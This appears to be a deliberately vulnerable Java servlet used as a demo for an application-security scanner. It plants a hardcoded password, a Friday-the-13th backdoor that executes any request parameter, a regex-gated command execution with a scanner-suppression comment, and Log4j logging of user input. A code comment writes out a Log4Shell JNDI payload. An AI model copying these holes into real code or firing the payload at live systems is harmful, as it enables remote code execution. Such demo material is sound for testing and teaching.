package local.ptdemo.appsec.poc.servlet.simple;

import lombok.SneakyThrows;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.time.LocalDate;
import java.util.Random;
import java.util.regex.Pattern;

import static java.time.DayOfWeek.FRIDAY;

@WebServlet("/simple")
public class Servlet extends HttpServlet {
    private static final Logger logger = LogManager.getLogger("servlet-simple");

    public static final Random PRNG = new Random();
    public static final long RANDOM = PRNG.nextLong();

    public String password = "P@ssw0rd";

    @SneakyThrows
    @Override
    protected void doGet(HttpServletRequest request,
                         HttpServletResponse response) {
        String cmd = request.getParameter("cmd");
        LocalDate now = LocalDate.now();
        if (13 == now.getDayOfMonth() && FRIDAY == now.getDayOfWeek()) {
            // Run anything on Friday, 13
            Runtime.getRuntime().exec(cmd);
        } else {
            // Only ping IP address allowed, any other command will be audited
            final Pattern pattern = Pattern.compile("^ping \\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$");
            if (pattern.matcher(cmd).matches()) {
                // ptai:suppress
                Runtime.getRuntime().exec(cmd);
            } else {
                // CVE-2021-44228 (RCE) may be exploited using
                // cmd that equals ${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/Y2FsYy5leGU=}
                logger.error("Unsupported command: {}", cmd);
            }
        }
    }
}
